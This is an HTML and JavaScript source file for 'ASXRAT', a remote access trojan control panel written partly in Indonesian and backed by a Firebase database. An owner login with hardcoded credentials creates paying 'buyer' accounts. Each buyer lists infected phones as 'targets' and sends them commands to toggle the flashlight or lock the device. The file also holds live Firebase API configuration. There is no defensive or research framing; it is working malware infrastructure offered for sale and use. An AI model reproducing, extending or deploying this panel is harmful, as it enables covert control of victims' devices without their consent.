<!DOCTYPE html>
<html>
<head>
    <title>V-PROJECT | RAT SYSTEM</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #050505; color: #00ffcc; font-family: monospace; padding: 20px; }
        .box { border: 2px solid #00ffcc; padding: 20px; border-radius: 15px; max-width: 500px; margin: auto; background: #000; box-shadow: 0 0 20px #00ffcc44; }
        input { width: 90%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #00ffcc; color: #fff; border-radius: 8px; text-align: center; }
        .btn { width: 100%; padding: 12px; margin: 5px 0; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
        .btn-buyer { background: #00ffcc; color: #000; }
        .btn-red { background: #ff3366; color: #fff; }
        .target-item { background: #111; border: 1px solid #00ffcc; padding: 15px; margin: 10px 0; border-radius: 8px; cursor: pointer; transition: 0.3s; }
        .target-item:hover { background: #00ffcc; color: #000; }
        #control-section { display: none; margin-top: 20px; border-top: 2px dashed #333; padding-top: 20px; }
        #login-box, #owner-panel, #buyer-panel { display: none; }
        .id-badge { color: yellow; font-size: 18px; font-weight: bold; margin-bottom: 15px; }
    </style>
</head>
<body>

<div id="login-box" class="box" style="display: block;">
    <h2>ASXRAT LOGIN</h2>
    <input type="text" id="user" placeholder="Username">
    <input type="password" id="pass" placeholder="Password">
    <button class="btn btn-buyer" onclick="handleLogin()">LOGIN</button>
</div>

<div id="owner-panel" class="box">
    <h3>OWNER PANEL</h3>
    <input type="text" id="new_u" placeholder="Buyer Username">
    <input type="text" id="new_p" placeholder="Buyer Password">
    <button class="btn btn-buyer" style="background:#bb00ff; color:#fff" onclick="createAccount()">CREATE BUYER</button>
    <hr color="#222">
    <div id="list-account"></div>
</div>

<div id="login-box" class="box" style="display: block;">
    <h2>ASXRAT REALTIME</h2>
<div id="buyer-panel" class="box">
    <div class="id-badge">ID ANDA: <span id="display_my_id"></span></div>
    <p style="font-size: 10px;">LIST TARGET ONLINE:</p>
    
    <div id="target-list">
        <p style="color:#555">Menunggu target...</p>
    </div>

    <div id="control-section">
        <p>CONTROLING: <b id="target_name_display" style="color:yellow"></b></p>
        <div style="display:flex; gap:5px;">
            <button class="btn btn-buyer" onclick="send('senter', 'ON')">SENTER ON</button>
            <button class="btn btn-red" onclick="send('senter', 'OFF')">OFF</button>
        </div>
        <div style="display:flex; gap:5px;">
            <button class="btn btn-red" onclick="send('lock', 'ON')">LOCK</button>
        </div>
        <button class="btn btn-red" onclick="closeControl()" style="margin-top:10px; font-size:10px;">TUTUP KONTROL</button>
    </div>
</div>

<script>
    const firebaseConfig = {
      apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
      authDomain: "rat-html.firebaseapp.com",
      databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "rat-html",
      storageBucket: "rat-html.firebasestorage.app",
      messagingSenderId: "1060124583265",
      appId: "1:1060124583265:web:a117830e798cd1d60f5120",
      measurementId: "G-XMHT2S731L"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let myActiveID = "";
    let selectedTargetDevice = "";

    function handleLogin() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        if(u === "elvoxi123" && p === "123") {
            document.getElementById('login-box').style.display = 'none';
            document.getElementById('owner-panel').style.display = 'block';
            loadAccounts();
        } else {
            db.ref('accounts/' + u).once('value', (s) => {
                if(s.exists() && s.val().pass === p) {
                    myActiveID = s.val().targetID;
                    document.getElementById('login-box').style.display = 'none';
                    document.getElementById('buyer-panel').style.display = 'block';
                    document.getElementById('display_my_id').innerText = myActiveID;
                    listenTargets();
                } else { alert("Data Salah!"); }
            });
        }
    }

    // Fungsi buat dengerin HP mana aja yang masuk ke ID Buyer ini
    function listenTargets() {
        db.ref('users/' + myActiveID).on('value', (snap) => {
            let html = "";
            snap.forEach((child) => {
                const deviceName = child.val().device_info || "Unknown Device";
                html += `<div class="target-item" onclick="openControl('${child.key}', '${deviceName}')">
                            📱 ${deviceName} (${child.key})
                         </div>`;
            });
            document.getElementById('target-list').innerHTML = html || "Belum ada target.";
        });
    }

    function openControl(deviceId, name) {
        selectedTargetDevice = deviceId;
        document.getElementById('target_name_display').innerText = name;
        document.getElementById('control-section').style.display = 'block';
    }

    function closeControl() {
        document.getElementById('control-section').style.display = 'none';
    }

    function send(k, v) {
        db.ref('users/' + myActiveID + '/' + selectedTargetDevice + '/' + k).set(v);
    }

    // Fungsi Owner
    function createAccount() {
        const u = document.getElementById('new_u').value;
        const p = document.getElementById('new_p').value;
        const tID = "EVX-" + Math.floor(Math.random() * 8999 + 1000);
        db.ref('accounts/' + u).set({ pass: p, targetID: tID });
    }

    function loadAccounts() {
        db.ref('accounts').on('value', (s) => {
            let h = "";
            s.forEach((c) => { h += `<div style='border:1px solid #333; margin:5px; padding:5px;'>U: ${c.key} | ID: ${c.val().targetID}</div>`; });
            document.getElementById('list-account').innerHTML = h;
        });
    }
</script>
</body>
</html>
